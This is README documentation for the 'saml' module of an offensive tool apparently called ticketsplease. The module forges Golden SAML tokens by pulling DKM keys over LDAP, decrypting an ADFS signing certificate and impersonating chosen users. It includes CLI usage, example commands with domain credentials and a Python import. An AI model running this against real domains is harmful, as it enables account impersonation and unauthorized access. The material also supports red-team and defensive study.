# saml Module

This module will generate a Golden SAML token using the EncryptedPfx extracted from an ADFS configuration and the DKM key pulled from a domain.

> This module requires the ADFS configuration settings, which can be pulled via the `adfs` module.

## How it Works

| Step | Process |
| ---  | ---     |
| 1    | Using LDAP, query the Domain Controller for the target user's (we are impersonating) UPN (userPrincipalName) and GUID (objectGuid) (if not provided). |
| 2    | Using LDAP, query the Domain Controller for the DKM (Distributed Key Manager) key (if not provided). |
| 3    | Decrypt the EncryptedPfx extracted from the ADFS configuration by deriving the keys from the DKM. |
| 4    | Generate and sign a Golden SAML ticket using the DecryptedPfx and the target user's UPN and GUID. |

## Usage

This module can be used via the command line or it can be imported as a module into your Python code base.

```
usage: ticketsplease saml [-h] [--adfs-config ADFS_CONFIG] [--adfs-config-file ADFS_CONFIG_FILE]
                          [--domain DOMAIN] [--target-user TARGET_USER] [--target-user-upn TARGET_USER_UPN]
                          [--target-user-guid TARGET_USER_GUID] [--dkm-key DKM_KEY]
                          [--assertion] [--debug] [--domain-username DOMAIN_USERNAME]
                          [--domain-password DOMAIN_PASSWORD] [--dc-ip DC_IP]

Generate a Golden SAML token

optional arguments:
  -h, --help            show this help message and exit

  --adfs-config ADFS_CONFIG
                        ADFS configuration settings.

  --adfs-config-file ADFS_CONFIG_FILE
                        File containing the ADFS configuration settings.

  --domain DOMAIN       Target domain the Golden SAML token is generated for (i.e. company.com).

  --target-user TARGET_USER
                        Username of the account to generate the Golden SAML token for.

  --target-user-upn TARGET_USER_UPN
                        UPN of the account to generate the Golden SAML token for (if not provided,
                        retrieved via LDAP).

  --target-user-guid TARGET_USER_GUID
                        GUID of the account to generate the Golden SAML token for (if not provided,
                        retrieved via LDAP).

  --dkm-key DKM_KEY     DKM Key (if not provided, retrieved via LDAP).

  --assertion           Extract the SAML Assertion from the token.

  --debug               Enable debugging.

ldap/wmic arguments:
  --domain-username DOMAIN_USERNAME
                        Username to perform DCSync operations with.

  --domain-password DOMAIN_PASSWORD
                        Password of the account to perform DCSync operations with.

  --dc-ip DC_IP         IP address of the target Domain Controller.

example usage:

    ticketsplease saml --adfs-config '...' --target-user-guid '...' --dkm-key '...' --assertion

    ticketsplease saml --adfs-config-file config.bin --domain company.com --target-user tUser \
                       --domain-username user --domain-password password --dc-ip 10.10.10.10
```

## Arguments - Use Cases

In order to generate a Golden SAML token, several pieces of information are required: target user GUID, DKM key, and ADFS configuration. If the target user GUID or the DKM key are not provided, the data will be retrieved via LDAP.

1. If no target user GUID or DKM key are provided:
```
--adfs-config-file <> --domain <> --target-user <> --domain-username <> --domain-password <> --dc-ip <>
```

2. If the required data can be provided, domain credentials are not required:
```
--adfs-config <> --target-user-guid <> --dkm-key <> --assertion
```

## Importing the Module

```python
from ticketsplease.modules.saml import generate_golden_saml

# This method will piece together all of the module handlers
# to generate a Golden SAML token (retrieve the required data,
# decrypt the EncryptedPfx, create and sign a SAML token)
golden_saml = generate_golden_saml(
    adfs_config,
    adfs_config_file,
    domain,
    target_user,
    target_user_upn,
    target_user_guid,
    domain_username,
    domain_password,
    dc_ip,
    dkm_key,
    assertion,
)
```

## Module Handlers

### wmic.py

This will leverage the provided username and password/password hash to retrieve a given service account's username via WMI (default is the ADFS service account).

### utils.py

Helper functions to extract the SAML Assertion.

### ADFSpoof.py

Modified version of [FireEye's ADFSpoof](https://github.com/fireeye/ADFSpoof) to generate a Golden SAML token with the DKM key and EncryptedPfx.
